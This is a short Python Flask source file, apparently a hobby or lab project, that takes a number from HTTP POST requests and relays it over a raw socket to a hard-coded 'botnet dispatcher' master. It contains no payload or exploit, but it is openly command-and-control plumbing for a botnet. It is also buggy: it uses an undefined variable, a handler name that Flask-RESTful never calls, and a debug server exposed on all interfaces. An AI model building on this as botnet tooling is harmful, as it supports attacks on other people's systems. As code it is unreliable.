#docker API

from flask import Flask, request, jsonify
from flask_restful import Resource, Api
from copy import deepcopy
import sys
import socket

'''
Simple API to send input to botnet dispatcher
'''

def control_print(msg):
    print("API CONTROL: ", msg)


#Define dispatcher constants
HOST = "172.16.76.85" #Preset IP of master
PORT = 25000

#Connect to dispatcher
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
control_print("Attempting to establish conn with master.")
while(True):
    try:
        sock.connect((HOST, PORT))
        control_print("Establish conn with master.");
        break
    except:
        continue


app = Flask(__name__)
api = Api(app)

def exit_critical():
    sys.exit("Critical error has occured, exiting...")

def get_num():
    num_str = request.args.get("number")
    control_print("Receive num.")
    return num_str

def send_num(num_str):
    control_print("Send num.")
    sock.sendall(num_str)

# -1 = bad number, 0 = good number
def check_num(num_str):
    control_print("Init check num.")
    try:
        num_int = int(num_str)
    except:
        return -1

    if num_int >= 0 and num_int <= 65535:
        control_print("Check num success")
        return 0
    else:
        return -1

class Botnet_RESTAPI(Resource):
    #On receive
    def on_post(self):
        control_print("Recv POST.")
        num = get_num()
        #If number is garbage
        if check_num(num_str) == -1:
            pass
        #Else if number is good
        else:
            send_num(num)

#Start API on port 5000
api.add_resource(Botnet_RESTAPI, '/')
if __name__ == "__main__":
    app.run(host="0.0.0.0", port="5000", debug=True)
